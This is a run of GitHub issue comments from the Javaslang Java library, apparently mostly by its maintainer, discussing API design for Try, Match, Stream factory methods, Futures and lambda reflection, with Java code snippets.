hope is, that future Java versions make parts of Javaslang unnecessary or enable us to rewrite current features in a more elegant way.\n. If in doubt, leave it. Can be added later if necessary.\n. ## Decision needed\nIt turns out that the current RandomAccessList is more a candidate for a Vector implementation (O(1) cons, O(log n) get) rather than to be a candidate for an Array implementation.\nScala has no immutable Array. Instead they have an ArrayWrapper which wraps a mutable Java array. We may also do this and call it Array. My idea: back Array by an array T[]. This fill be fully copied internally (fast, via System.arrayCopy()) on each resize operation (remove, insert, ...).\nAlso we will not re-implement Vector with a back of RandomAccessList (RAL) because the RAL is currently not balanced. I'm not sure if this behaves as good as HAMT does in practice. On the other hand we may add balancing by using red-black trees instead of binary leaf trees. However, the red-black tree currently has values at all nodes. It has to be further investigated, if a special red-black tree implementation with values only at leafs can be made.\nThe RandomAccessList may be a substitute for the lists used in a HAMT at ArrayNodes. Also, if not balanced.\n. Yes, we should do this! We need O(1) here if possible. Don't know if there is any use for RAL. Thought of using it as back of Vector instead of HAMT to reduce the number of intermediate objects - but I think HAMT is a good choice for Vector if we back the ArrayNodes by T[].\n. Fixed by @ruslansennov \n. Hi Martin,\nthat is a great addition because it solves an issue in an elegant way I wrapped my head around again and again. Let me explain: Contrary to most other languages Java has checked exceptions. We can't use method signatures with checked and unchecked exceptions side-by-side because of ambiguities. On the one hand the Try monad deals with exceptions. Because of this we want methods take checked functions as arguments, so that we are able to deal with code that throws. On the other hand, all other monads are using the unchecked functions in their method signatures. It is important to have a common behavior because we (will) need a common interface for these monadic types.\nThe method you added was there a few weeks ago but it had another name: map. Before map took a CheckedFunction. I had to change the signature, now it takes a Function. The reason is the common behavior of monadic types I mentioned above. The current solution is to flatMap throwing code. Your method is syntactic sugar for that. I will comment your change - we can replace the if statement with the shorter flatMap variant.\n\nThe change I proposed seem functionally fine, but fail on the \"TypeConsistencyTest\". I'm not too sure what is incorrect, if it's something i've missed?\n\nThere are many cases where it makes sense to use covariant (= more specific) return types in sub classes. The \"TypeConsistencyTest\" checks that. Example:\n``` java\n// defined in Try - we know nothing specific about the return type\nTry recover(Function f);\n// defined in Success - we know that calling success.recover(...) will definitely return a Success\nSuccess recover(Function f) { return this; }\n// defined in Failure - we know nothing specific about the return type\nTry recover(Function f) {\n    return Try.of(() -> f.apply(cause.getCause()));\n}\n```\nBut there are also cases, like this, where the TypeConsistencyTest falsely reports an error. Then we just add an exception to the test. Please add the following lines to the TypeConsistencyTest class. I copy-and-pasted most of these from the unit test output (format: <class> '//' <method>). Hopefully they are correct, you can test it with a mvn clean test.\n``` java\n// control.Failure\n...\n\"javaslang.control.Failure//public default javaslang.control.Try javaslang.control.Try.andThen(javaslang.CheckedFunction1)\",\n// control.Success\n...\n\"javaslang.control.Success//public default javaslang.control.Try javaslang.control.Try.andThen(javaslang.CheckedFunction1)\",\n```\nMany thanks!\nUpdate: In fact this is not 100% correct - the Failure.andThen(CheckFunction1) will always return a Failure. But this does not matter, just go with the solution mentioned above for now. Failure would have to override the andThen method and do an unchecked cast return (Failure<R>) this;\n. Sorry for the inconvenience, had to think again. The best way to do it (from the API view point) is the following:\n``` java\nTry.java\n\n Try andThen(CheckedFunction1 f);\nSuccess.java\n@Override\npublic  Try andThen(CheckedFunction1 f) {\n    return flatMap(value -> Try.of(() -> f.apply(value)));\n}\nFailure.java\n@SuppressWarnings(\"unchecked\")\n@Override\npublic  Failure andThen(CheckedFunction1 f) {\n    return (Failure) this;\n}\nTypeConsistencyTest.java\n// control.Success\n...\n\"javaslang.control.Success//public default javaslang.control.Try javaslang.control.Try.andThen(javaslang.CheckedFunction1)\",\n```\nPlease note that TypeConsistencyTest now only contains an exception-rule for the Success case.\nI really hope you do not run away regarding this mess I made :-)\n. great!\n. Thx!\n. @johnmcclean-aol This sounds great. I also see the emerging 'diversification' of functional style libs in the Java eco-system. My intention creating Javaslang was (the same as for everyone else) to add missing functionality to Java, which in turn was designed with the focus to be backward compatible. I would love to see the new libs converging to a standard. Waiting for Java to include things does not help, it will take too long.\nI'm currently busy with reviewing two new functional Java books. Soon I'm able to get back to this issue. I will take a look at your project and give you feedback.\n. @johnmcclean-aol Awesome, thanks for doing all the work. I will check it out.\n. This may go along with #288. I've a proposal in the pipeline. There will be an article/blog post soon...\n. This analysis is finished. We re-added the Monad-interface to Javaslang 2.0.0-RC*. We lift functions to monadic functions now.\n. This sounds great!\nFirst thing to mention is that Future should reside in the package javaslang.concurrent. This aligns with Scala's and Java's concurrent package (although you are right that a Future is some sort of deferred Try, which is a control).\nI will add some line comments to your Future prototype.\n. It does not matter - your branch is merged in each case in Javaslang master.\n. I have to sleep one night on the xxxTry methods. Better would be to omit the Try. But I see the ambiguities after type erasure. We will see...\n. I was busy the last days but did not forget it... I will check the Try parts until this weekend.\n. @DillonJettCallis My Lord, we should pull a first version of the futures branch to javaslang/master. Your's is fine! Refactoring can be made later.\n(Much has changed within the last month. You may want to git fetch upstream, git merge upstream/master.)\n. Fixed by Dillon.\n. See PR #315 \n. Now we are able to write:\njava\nMatch\n    .when((int i) -> i)\n    .when((Integer i) -> i)\n    .when(1).then(i -> i)   // before: when(1, i -> i)\n    .when(2).then(() -> 1)  // before: when(2, ignored -> 1)\n    .whenIn(3, 4, 5).then(i -> i)\n    .whenIn(6, 7, 8).then(() -> 1)\n    .whenNull().then(n -> 1)\n    .whenNull().then(() -> 1)\n    .apply(1000);\nIn the meantime the Match API emerged. Instead of using it as function (as shown above), we now may use it as Monad by capturing the value to be matched at the beginning with 'of'.\nThe new when().then() / whenIn().then() syntax has also to be added to the Match.of() branch of the API. Then we will also able to write:\njava\nMatch.of(1000)\n    .when((int i) -> i)\n    .when((Integer i) -> i)\n    .when(1).then(i -> i)   // before: when(1, i -> i)\n    .when(2).then(() -> 1)  // before: when(2, ignored -> 1)\n    .whenIn(3, 4, 5).then(i -> i)\n    .whenIn(6, 7, 8).then(() -> 1)\n    .whenNull().then(n -> 1)\n    .whenNull().then(() -> 1)\n    .get(); // .orElse(...) .orThrow(...) etc.\n. Note:\nBecause of ambiguities we cannot use when(null).then(...). Therefore whenNull().then(...) was introduced.\nTODO: whenNull().then(...) should be simplified to whenNull(...), in two variants with a single argument: Supplier and Function.\nUpdate: we stay with whenNull().then(...) because it is consistent syntax\n. @martincooper First shot of Match rework finished.\nAlso added a whenTypeIn(class_1, ..., class_n).then(...). Removed whenNull, it is not necessary any more.\nThe generic type bounds are currently cluttered. Will do this next.\nUnit tests and javadoc + the website have to be updated before the release. I think end of next week is realistic.\n. @martincooper I'm afraid, I can't push the current master to maven central. The Match rework isn't finished yet. At least we have to cover the new API with unit tests. I hacked it from the brain to my git fork. Also, I'm on a trip for a few days and can go back to my notebook within the next week.\nWe have to do it right, publishing a version before makes no sense.\nBut luckily I have now vacation (4 weeks) and more time to work on Javaslang.\n. Thanks! I will put it all together the next days.\nEnjoy your hols, too :)\n. Thank you!\n. It should be all fine.\nHere is 2.0.0-beta: https://github.com/javaslang/javaslang/blob/javaslang-2.0.0-beta/src/main/java/javaslang/collection/List.java#L594\nand 2.0.0-RC1: https://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/collection/List.java#L593\nDo we have a regression? Do you have an example?\nThx!\n. Thx for the info - then I expect it to work (it should because of the unit tests).\n. Could be still improved as commented by @szarnekow in #306 \n. This pull request was finally merged with #308 and #309 \n. Great!!\n. Thank you, I will check it tomorrow!\n- Daniel\n. @tcn It is just the missing generic argument of Stream in the return type of try1. If you write\njava\nTry<Tuple3<String, Long, Stream<String>>>\ninstead of\njava\nTry<Tuple3<String, Long, Stream>>\nall compiles fine.\nBut I agree - the error message of the java compiler is weird.\n. I'm closing this bug as invalid since it is not related to Javaslang.\n. Hi Martin,\nnice feature! For simple logging/System.out there is a peek(Consumer) method but the checked case is very useful.\nYou previously added the nice andThen(CheckedFunction1). As we see (and the compiler complains) andThen(Consumer) is potentially ambiguous with that. I agree that andThenRun is too long. The origin of the method andThen is from the class java.util.function.Consumer. I want to preserve this name to be consistent with the standard Java naming.\nLet's solve the ambiguity by renaming andThen(CheckedFunction1) to mapTry(CheckedFunction1). This is what it really is. Then, it would be natural to also have a flatMapTry(CheckedFunction1) (same signature as flatMap but using a CheckedFunction1).\nThe other andThen methods remain andThen(CheckedRunnable) and andThen(CheckedConsumer).\nPlease see also my notes on the code (in a sec).\nThanks\nDaniel\n. I like it to see Try emerging. Thanks for your contribution!\n. Hi Martin,\nthis looks good! I like the whenIn(...).then(...) and when(...).then(...) syntax.\nIt seems you changed the generated Match class. Changes will be overwritten when re-generating sources, e.g. by calling mvn clean generate-sources. I'm currently also changing the Match generator (see #227) and about to merge it into master this evening (there will be a new Match.of(...) syntax that allows strong typed match expressions and monadic behavior like map, flatMap, filter).\nIf you don't mind, I will rework the Match generator according to your suggestion, because I'm already on it (see Generator.scala).\nWhat do you think?\n- Daniel\n. Thanks for making Match awesome! I will push a first version until tomorrow...\n. > I will push a first version until tomorrow...\nNeed sleep :) Will go on tomorrow...\n. The new syntax is now in place, details provided in #302.\n. Woops, closing this as duplicate of #302 - knew I missed s.th. :)\n. Note: Match is currently the only 'user' of lambda reflection\n. In order to eventually reach the next milestone, I now concentrate on adding features. Full coverage will be restored before the release.\n. S.th. like\n``` java\ninterface Value {\nboolean isEmpty();\n\nT get();\n\ndefault boolean isDefined() {\n    return !isEmpty();\n}\n\ndefault T orElse(T other) {\n    return isEmpty() ? other : get();\n}\n\ndefault T orElseGet(Supplier<? extends T> supplier) {\n    return isEmpty() ? supplier.get() : get();\n}\n\ndefault <X extends Throwable> T orElseThrow(Supplier<X> exceptionSupplier) throws X {\n     if (isEmpty()) {\n         throw exceptionSupplier.get();\n     } else {\n         return get();\n     }\n}\n\ndefault Option<T> toOption() {\n     return isEmpty() ? None.instance() : new Some<>(get());\n}\n\ndefault Optional<T> toJavaOptional() {\n    return isEmpty() ? Optional.empty() : Optional.ofNullable(get());\n}\n\n}\n```\n. Surprisingly these types are handled correctly by Match:\n``` java\nclass A {}\nclass B extends A {}\nclass BB extends B {}\nclass C extends A {}\nclass D {}\n```\nExamples:\n``` java\n// works!\nMatch.of(new A())\n        .when((B b) -> 0)\n        .when((C c) -> 0);\n// does not compile, as expected!\nMatch.of(new A())\n        .when((D d) -> 0); // <-- wrong\n// works!\nMatch.of(new B())\n        .when((A a) -> 0)\n        .when((BB bb) -> 0);\n// does not compile, as expected!\nMatch.of(new B())\n        .when((A a) -> 0)\n        .when((C c) -> 0); // <-- wrong\n// but this does compile unexpectedly:\nMatch.of(new A())\n        .when((B b) -> 0)\n        .when((Try<?> trY) -> 0); // <-- WTF!?\n```\n. Lets consider the following:\njava\nMatch.of(value)\n    .when(prototype).then(function1)\n    .whenTypeIn(class1, class2, class3).then(function2)\n    .get();\nI have use-cases where it is not viable to propagate the value type to when:\n``` java\ninterface List {\nT head();\n\ndefault String test() {\n    return Match.of(head())\n        .whenTypeIn(Int.class, Long.class).then(() -> \"number\")\n        .whenIn(\"hi\", \"ho\").then(s -> \"known string: \" + s)\n        .whenType(String.class).then(s -> \"unknown string: \" + s)\n        .when(null).then(() -> \"null\")\n        .otherwise(o -> throw new Error(\"unsupported type: \" + o.getClass().getName()))\n        .get();\n}\n\n}\n```\nThe type of head() is T, which is unknown at compile time. Disallowing arbitrary types would make Match.of useless in many cases. A solution would be to interpret a generic type parameter as Object, but that is not possible in Java when using generics - a generic type parameter T is of type T, not of type Object.\n. Note: There are two tricks for (unsafe) matching generic types using the new 2.0.0 API:\njava\nMatch\n    .when((Function1<Integer, String> f) -> true).then(f -> f.apply(1))\n    .whenType(Function1.class).<Function1<Integer, String>> then(f -> f.apply(2));\nThe Match API of 1.2.2 had:\njava\nMatch\n    .when((Function1<Integer, String> f) -> f.apply(1))\n. To get the advantages of the 1.2.2 API and the consistent when().then() syntax of the 2.0.0 API we may add a\njava\nMatch\n    .whenApplicable((Function1<Integer, String> f) -> f.apply(1)).thenApply()\n. Because of a Java bug(!?) we need a Function1 to have reflection capabilities.\nSee What the lambda? #WTL\n. Yes, me too. I also think that the second one is concise anyway.\nI'm currently not sure if there is any benefit having the primitive functions to match by type. See these examples. I think we may safely remove them...\n. Hi Martin, thanks for the description - I will take a look now...\n. In fact, the problem is the iterator().\nA Stream is either a Cons(head, () -> tail) or Nil, where tail is also a Stream. In order to check whether the iterator has a next element, we have to check, if the tail Stream is a Cons or Nil. But when the iterator performs this check and tail is a Cons, the head of the tail Stream is evaluated.\nTo circumvent this we may wrap the head in a Lazy<T>. Then it will be evaluated only when head() is called. This would be the simplest solution but I have to think about it, if there is another solution which does not need an additional object...\n. Btw - great finding!!\n. > From what I understand, flatMap would not stop when a Failure occurred, just removes them from the returned results?\nYes, should be right\n. A better explanation why Traversable.flatMap does filter out Failures:\nIt maps elements to Iterables and flattens all iterables to one Traversable in their order of occurrence. Collections and controls (Option, Try, ...) share the common interface Iterable. This is why Try instances can be flattenend to form a Traversable. In particular a Failure is empty because it contains no resulting value (but an exception that does not count as element).\n. :+1:\n. Maybe this can be achieved with a ZAM interface Memoized {} in conjunction with intersection types:\njava\ninterface Function1<T, R> {\n    Function1<T, R> memoized() {\n        if (this instanceof Memoized) {\n            return this;\n        } else {\n            final Function1<T, R> f = ...\n            return (Function1<T, R> & Memoized) f;\n        }\n    }\n}\n. dup of #333 \n. Thank you J\u00f6rgen, very nice!\nSorry for the delayed answer, I just returned from a journey.\nHave a great week,\nDaniel\n. No, for now we will have one source for documentation, our ascii-doc.\n. \n. Again, this is unsafe and potentially leads to runtime errors.\nWorkaround: flatten(Function)\n. Moving StreamTest range tests to AbstractSeqTest, because all Seq impls will implement the static range methods.\nIn order to write javadoc only once, seq will get static factory methods, too, which delegate to static factory methods of List (as default Seq, likewise to Scala).\nThe javadoc of the the static range factory methods of the Seq impls (currently Stream, List, Queue, Stack) will @inheritDoc the javadoc of the Seq range methods.\n. Oooh, @inheritDoc does not work here. Wanted to copy javadoc of a static method in a super interface. Never mind, we will copy-paste all docs n-times.\n. TODO: create class SeqTest (extends AbstactSeqTest?) which tests the new static factory methods.\n. Note: The Seq factory method will be removed again. They where introduced to share javadoc (which is not possible, see above). It is not not fully transparent that Seq.xxx will remove List.xxx. Use List.xxx directly instead.\n. Awesome, thanks!\n. Note: I've taken a look at shadaj/euler and modified some of our solutions slightly. That brought a performance boost of factor 3 to 4. The travis ci builds now run in 3-4 min. instead of 12-13 min.\n/cc @jorander \nbefore: https://travis-ci.org/javaslang/javaslang/builds/72619743\nafter: https://travis-ci.org/javaslang/javaslang/builds/72638424\n. Oohh, bitten by #361\n. There will be no ambiguities when naming the methods of, i.e. the following works:\n``` java\n// = Stream.of(T...)\nStream s1 = Stream.of(1, 2, 3);\n// = Stream.of(int[])\nStream s2 = Stream.of(new int[] {1, 2, 3});\n// = Stream.of(T...)\nStream s3 = Stream.of(new Integer[] {1, 2, 3});\n```\nUpdate: There IS an ambiguity when naming the methods of and we need array as component type:\n``` java\n// HERE of(T) AND of(int[]) ARE AMBIGUOUS\nStream s4 = Stream. of(new int[] {1, 2, 3});\n// = Stream.of(T)\nStream s5 = Stream. of(new Integer[] {1, 2, 3});\n```\n. ## Naming Things\nWe already have:\n- of(T)\n- of(T...)\n- ofAll(Iterable<T>)\n- ofAll(Iterator<T>)\nNow, what is the best name for of(int[]), of(long[]), ...?\n- of does not work because it introduces ambiguities (mentioned above).\n- ofAll would emphasize that an array has multiple elements but of(T...) should then also be named ofAll(T...). But this would differ from the Java standard API, e.g. java.util.stream.Stream.of(T), j.u.s.Stream.of(T...).\nThis leads to the decision to choose another name than of or ofAll.\nCandidates are ofInt resp. ofInts.\n- ofInt would emphasize that the component type is int resp. Integer\n- ofInts would emphasize that the argument type is int[]\nThe all leads to a brain loop...\nWe could name things explicitely without introducing inconsistencies compared to Java's std lib, namely:\nThese will stay because of std lib conformity:\n- of(T) (note: remember to use .<Type[]> of(array) if the component type is an object array!)\n- of(T...)\nThese will change:\n- ofIterable(Iterable<T>)\n- ofIterator(Iterator<T>)\nThese will be new and also be consistent to the above:\n- ofInts(int[]), ofLongs(long[]), ...\nWhat I do not like about this is the redundancy of the method names and the method arg type name (, i.e. ofXxx(Xxx)).\nUpdate: On the other hand it would clarify which of the various of variants we use. However, I'm a friend of Let me just throw it in and gimme an instance but please don't bother me with the details!\nIf this is a viable solution, the major 2.0.0 release would be the perfect moment to make slight API changes.\n. Now we have:\n``` java\n// = Stream.of(T...)\nStream s1 = Stream.of(1, 2, 3);\n// = Stream.ofInts(int[])\nStream s2 = Stream.ofInts(new int[] {1, 2, 3});\n// = Stream.of(T...)\nStream s3 = Stream.of(new Integer[] {1, 2, 3});\n// Stream.of(T)\nStream s4 = Stream.of(new int[] {1, 2, 3});\n// Stream.of(T)\nStream s5 = Stream. of(new Integer[] {1, 2, 3});\n``\n. Also: removestatic  Stream ofAll(Iterator<? extends T> elements)` completely. This is internal API and will be a private interface method in a future Java version.\nUntil this happens, calls to this method can be replaced by ofAll(Iterable), i.e. ofAll(() -> iterator)\n. I ask myself what happens if we just remove the of(T) method. Calling of(T...) with one argument should be equivalent. Or maybe additionally change of(T...) to of(T, T...) to enforce at least one argument. When an empty instance is needed we call empty() or nil(), depending on the type.\nGiven that, can we then call all factory methods of()? I will check this...\nUpdate: This leads to ambiguities and is no viable alternative.\n. An alternative (to ofIterable(), ofInts(), ofLongs(), ...) is to keep the ofAll() (also for primitive arrays). Then we have:\n``` java\n// = Stream.of(T...)\nStream s1 = Stream.of(1, 2, 3);\n// = Stream.ofInts(int[])\nStream s2 = Stream.ofAll(new int[] {1, 2, 3});\n// = Stream.of(T...)\nStream s3 = Stream.of(new Integer[] {1, 2, 3});\n// Stream.of(T)\nStream s4 = Stream.of(new int[] {1, 2, 3});\n// Stream.of(T)\nStream s5 = Stream. of(new Integer[] {1, 2, 3});\n```\nNote: The above examples are not well ordered. This is better:\njava\nStream<Integer>   s1 = Stream.of(1, 2, 3);\n                     = Stream.of(new Integer[] {1, 2, 3});\nStream<Integer[]> s2 = Stream.<Integer[]> of(new Integer[] {1, 2, 3});\nStream<int[]>     s3 = Stream.of(new int[] {1, 2, 3});\nStream<Integer>   s4 = Stream.ofAll(new int[] {1, 2, 3});\nHere we see that this is crap from the user perspective.\nBetter would be to have just two methods:\n- of(T...)\n- cons(T)\nThe cons(T) factory method takes what comes - without regret:\njava\nStream<Integer[]> s1 = Stream.cons(new Integer[] {1, 2, 3});\nStream<int[]>     s2 = Stream.cons(new int[] {1, 2, 3});\n~~The of(T...) factory method is intelligent and checks the args to decide what to do:~~\njava\nStream<Integer> s3 = Stream.of(1, 2, 3);\nStream<Integer> s4 = Stream.of(new Integer[] {1, 2, 3});\nStream<Integer> s5 = Stream.of(new int[] {1, 2, 3}); // CAN'T BE EXPRESSED LIKE THIS WITH JAVA\nStream<Integer> s6 = Stream.of(List.of(1, 2, 3)); // CAN'T BE EXPRESSED LIKE THIS WITH JAVA\n~~In other words the collection's of(T...) method decomposes varargs, Object arrays, primitive arrays and Iterables into its components.~~\n~~If we need to construct a collection which contains exactly the given element, no matter which type, we need to use cons(T).~~\n~~Deal?~~\nUpdate: One more word - explain a newbie why the varargs of(T...) decomposes a Integer[] but not a int[]. Logically that makes no sense without knowing all the Java internals. Arrays should be treated the same. And this is where comes the slang of Javaslang into play - tweaking the language to behave like we would expect it. IMO the primitive data types are the biggest burden of Java...\nUpdate: Of course this CAN'T BE EXPRESSED WITH JAVA (see above). One reason that makes me really want to change the language...\n. This is the only viable solution:\n``` java\nStream       s1 = Stream.of(1);\nStream       s2 = Stream.of(1, 2, 3);\n                      // = Stream.of(new Integer[] {1, 2, 3});\nStream         s3 = Stream.of(new int[] {1, 2, 3});\nStream> s4 = Stream.of(List.of(1, 2, 3));\nStream       s5 = Stream.ofAll(new int[] {1, 2, 3});\nStream       s6 = Stream.ofAll(List.of(1, 2, 3));\n// cuckoo's egg\nStream     s7 = Stream. of(new Integer[] {1, 2, 3});\n                      //!= Stream. of(1, 2, 3);\n```\nHaving\n``` java\ninterface Stream {\nstatic <T> Stream<T> of(T element) {\n    return ...;\n}\n\n@SafeVarargs\nstatic <T> Stream<T> of(T... elements) {\n    return ...;\n}\n\nstatic Stream<Integer> ofAll(int[] elements) {\n    return ...;\n}\n\nstatic <T> Stream<T> ofAll(Iterable<? extends T> iterable) {\n    return ...;\n}\n\n}\n```\n. Great, thx!\n. Also, it would be politically correct to specify bounds for final types.\nE.g. instead of\njava\n@Override\n<T1, T2> Tuple2<? extends Stack<T1>, ? extends Stack<T2>>\n        unzip(Function<? super T, Tuple2<? extends T1, ? extends T2>> unzipper);\nwe should use\njava\n@Override\n<T1, T2> Tuple2<? extends Stack<T1>, ? extends Stack<T2>>\n         unzip(Function<? super T, ? extends Tuple2<? extends T1, ? extends T2>> unzipper);\nbecause it is more robust, e.g. if the Tuple2 final modifier is removed in future (however, this will not happen in this case...).\nBut first check, if this could break existing code when doing this...\n. @szarnekow Thanks for spending some of your spare time!\n. The following does not compile (in both cases) with -Xlint:all -Werror:\n``` java\npublic class Test {\n@SafeVarargs\nstatic <T> void test(T... elements) {\n\n    // WARNING: Varargs method could cause heap pollution from non-reifiable varargs parameter elements\n    SafeStream<T> stream1 = SafeStream.of(elements);\n\n    // WARNING: Varargs method could cause heap pollution from non-reifiable varargs parameter elements\n    UnsafeStream<T> stream2 = UnsafeStream.of(elements);\n}\n\ninterface SafeStream<T> {\n\n    @SafeVarargs\n    @SuppressWarnings(\"varargs\")\n    static<T> SafeStream<T> of(T... elements) {\n        return null;\n    }\n}\n\ninterface UnsafeStream<T> {\n\n    @SafeVarargs\n    static <T> UnsafeStream<T> of(T... elements) {\n        return null;\n    }\n}\n\n}\n```\nHowever, this version of the test method makes the compiler happy:\n``` java\n@SafeVarargs\nstatic  void test(T... elements) {\n@SuppressWarnings(\"varargs\")\nSafeStream<T> stream1 = SafeStream.of(elements);\n\n@SuppressWarnings(\"varargs\")\nUnsafeStream<T> stream2 = UnsafeStream.of(elements);\n\n}\n```\nSee also nonReifiableVarargsType by Oracle.\nNonetheless, this is crap from the user perspective IMO.\n. Nothing we can do here.\n\nThe prohibition on generic array creation can be annoying. It means, for example, that it\u2019s not generally possible for a generic type to return an array of its element type (but see Item 29 for a partial solution). It also means that you can get confusing warnings when using varargs methods (Item 42) in combination with generic types. This is because every time you invoke a varargs method, an array is created to hold the varargs parameters. If the element type of this array is not reifiable, you get a warning. There is little you can do about these warnings other than to suppress them (Item 24), and to avoid mixing generics and varargs in your APIs.\n\n[Effective Java 2nd Edition, Item 25]\n. Best explanation so far by Oracle:\nImproved Compiler Warnings and Errors When Using Non-Reifiable Formal Parameters with Varargs Methods\n. There has been already effort in simplifying the of* methods.\n. I recognized, that very old github issues are referenced from all of our Project Euler commits.\nThis merge will be mentioned in the issues no. 29 and 57 because of the '#' in the comment:\nSolutions for problems #29, #57.\nAre you able to change the merge/commit comment to the following?\nSolutions for problems 29, 57.\n:-))\n. \n. This. Is. Cool. :)\n. javac complains: \"reference to cons is ambiguous\"\n[ERROR] both method <T>cons(T,java.util.function.Supplier<javaslang.collection.Stream<T>>) in javaslang.collection.Stream and method <T>cons(java.util.function.Supplier<T>,java.util.function.Supplier<javaslang.collection.Stream<T>>) in javaslang.collection.Stream match\nFeature cancelled.\n. Workaround: Use new Stream.Cons(Supplier, Supplier) instead.\n. Great, thx!\n. Wow, really nice. Never heard of this, yet.\nI ask myself if a similar/slightly different functionality could be used to calculate primes with the sieve of eratosthenes?\n. Sounds good. Would be great if you can do it!\n. Totally awesome, thanks!\n. Lazy itself will not be proxied. We will better not change the class vs interface design at this point.\n. One word about safety:\nJava's Proxy is not safe. It throws at runtime when an objects is passed instead of an interface at construction time.\nSo does Lazy. It throws at runtime when creating a lazy value of an object instead of an interface. This is the best we can do. But I think the benefits of having this functionality prevail.\nIn general Javaslang's design rule is 'safety prior feature'.\n. Thx!\n. I've looked into it - it is not the same as traverse(). We will stay with appendSelf().\n. Thanks Ruslan, for joining me on the journey to 2.0.0 :)\n. :+1: \n. Maybe. Please ensure, that log.error() returns a String. Does it currently return void?\nAt least this one compiles with the current Javaslang 2.0.0 master branch:\n\nPlease note that the API slightly changed. The naming was aligned to other matching frameworks. Also it is more powerful now. You may also write:\n\nThanks for using Javaslang!\nDaniel\n. @mkorobeynikov In your case please try:\njava\n        final String result = Try.of(this::toString)\n                .recover(x -> Match.caze((IOException e) -> {\n                            log.error(e.getMessage());\n                            return \"\";\n                        })\n                        .apply(x))\n                .orElse(\"\");\nUpdate: Btw, if you don't need the x you can get rid of it by:\njava\n        final String result = Try.of(this::toString)\n                .recover(Match.caze((IOException e) -> {\n                            log.error(e.getMessage());\n                            return \"\";\n                        })::apply)\n                .orElse(\"\");\nUpdate 2:\nIn your case you can also call get() instead of orElse(\"\") because recover() provides you with a default value when an error occurs.\n. It's my pleasure!\n:+1: \n. There aren't any distracting bugs any more other than this I recently opened at IntelliJ and which seems to be already fixed.\n. Method References: Deriving the MethodType from SerializedLambda.instantiatedMethodType did the job of reflecting the lambda type of method references. Before it was derived by SerializedLambda.implMethodSignature.\nLambda Serialization: Still works after the change mentioned above.\nMy test code:\n``` java\nimport javaslang.Function1;\nimport javaslang.\u03bb;\npublic class Test {\npublic static void main(String[] args) {\n\n    /* add1.getType(): (Integer)Integer\n       SerializedLambda[\n           capturingClass=class javaslang.control.Test,\n           functionalInterfaceMethod=javaslang/Function1.apply:(Ljava/lang/Object;)Ljava/lang/Object;,\n           implementation=invokeStatic javaslang/control/Test.lambda$main$837efc8d$1:([Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;,\n           instantiatedMethodType=(Ljava/lang/Integer;)Ljava/lang/Integer;,\n           numCaptured = 1\n       ]\n    */\n    Function1<Integer, Integer> add1 = i -> i + args.length;\n    printInfo(\"add1\", add1); // (Integer)Integer\n\n   /* add2.getType(): (Integer)Integer\n      SerializedLambda[\n          capturingClass=class javaslang.control.Test,\n          functionalInterfaceMethod=javaslang/Function1.apply:(Ljava/lang/Object;)Ljava/lang/Object;,\n          implementation=invokeInterface javaslang/Function1.apply:(Ljava/lang/Object;)Ljava/lang/Object;,\n          instantiatedMethodType=(Ljava/lang/Integer;)Ljava/lang/Integer;,\n          numCaptured=1\n      ]\n    */\n    Function1<Integer, Integer> add2 = add1::apply;\n    printInfo(\"add2\", add2); // (Integer)Integer\n\n   /* add3.getType(): (Integer)Integer\n      SerializedLambda[\n          capturingClass=class javaslang.control.Test,\n          functionalInterfaceMethod=javaslang/Function1.apply:(Ljava/lang/Object;)Ljava/lang/Object;,\n          implementation=invokeStatic javaslang/control/Test.lambda$main$6d066013$1:(Ljavaslang/Function1;Ljava/lang/Integer;)Ljava/lang/Integer;,\n          instantiatedMethodType=(Ljava/lang/Integer;)Ljava/lang/Integer;,\n          numCaptured=1\n      ]\n    */\n    Function1<Integer, Integer> add3 = i -> add1.apply(i);\n    printInfo(\"add3\", add3); // (Integer)Integer\n}\n\nstatic void printInfo(String name, Function1<?, ?> f) {\n    System.out.printf(\"%s: %s\\n%s\\n\\n\", name, f.getType(), \u03bb.getSerializedLambda(f));\n}\n\n}\n```\n. Fixed (~ 35% faster)\n. It is not ~ 35% faster.\n. Match.MatchFunction was already refactored. See this merge.\n. This is great, many thanks!\nThe method nil() called within Future changed to empty(). I think this is the reason why the ci build fails.\nPlease do the following:\njava\ngit remote -v\ngit remote add upstream https://github.com/javaslang/javaslang.git\ngit remote -v\ngit fetch upstream\ngit checkout futures\ngit merge upstream/master\nto merge the actual Javaslang master into your project. When in doubt with errors or new API let me know. We can fix the stuff - just commit the merged stuff to get travis-ci feedback on success or errors.\nThanks!\nDaniel\n. Sorry, don't know why I didn't merged it - thought that the build failed.\nGreat work!!\n. Hi @DillonJettCallis,\ndo you mind if I remove the @author tags from javadoc? There are no other @author tags in the project and I want to keep it consistent.\nAlso it is redundant to the git repo history, where all contributors are mentioned.\nInstead I plan to create some sort of 'hall of fame' on the homepage, where people like you and @ruslansennov are explicitly mentioned in conjunction with their efforts (Futures, Collections, etc.).\nDeal?\n. Great!\nThe hall of fame will be cool. I'm currently re-designing the page :-)\n. I'm not sure about this. Is this useful? Or is a lazy value just a lazy value?\nWill push this issue to the backlog.\n. Done with #411 \n. Our collection lib starts to get a great toolbox!\n. @ruslansennov I added Traversable.unit() because I need it for a Monad abstraction. Here it comes handy to hide impl details from the public API.\nBtw. I like your unit tests - all of them, not only these! The are very mature. Good tests help so much when refactoring code.\n. Awesome, also the Javadoc!\n. We could also align this to the Scala Mirror API. But I do not want to re-invent the Java reflection wheel or over-engineer this one.\n. I prefer to name it FunctionN.Type instead of FunctionN.TypeN:\njava\nFunction1.Type type = Function1.lift((Integer i) -> i + 1).getType();\nfor the case it is an inner class, because the outer class provides a semantic context.\n. This is amazing ;-)\nHaving\n``` java\npublic interface \u03bb {\ndefault Type<R> getType() {\n\n    class ReflectionUtil {\n\n        MethodType getLambdaSignature(Serializable lambda) {\n            final String signature = getSerializedLambda(lambda).getInstantiatedMethodType();\n            return MethodType.fromMethodDescriptorString(signature, lambda.getClass().getClassLoader());\n        }\n\n        SerializedLambda getSerializedLambda(Serializable lambda) {\n            return Try.of(() -> {\n                final Method method = lambda.getClass().getDeclaredMethod(\"writeReplace\");\n                method.setAccessible(true);\n                return (SerializedLambda) method.invoke(lambda);\n            }).get();\n        }\n    }\n\n    return () -> new ReflectionUtil().getLambdaSignature(this);\n}\n\ninterface Type<R> {\n\n    MethodType asMethodType();\n\n    @SuppressWarnings(\"unchecked\")\n    default Class<R> returnType() {\n        return (Class<R>) asMethodType().returnType();\n    }\n\n    default Class<?>[] parameterArray() {\n        return asMethodType().parameterArray();\n    }\n\n    default int parameterCount() {\n        return asMethodType().parameterCount();\n    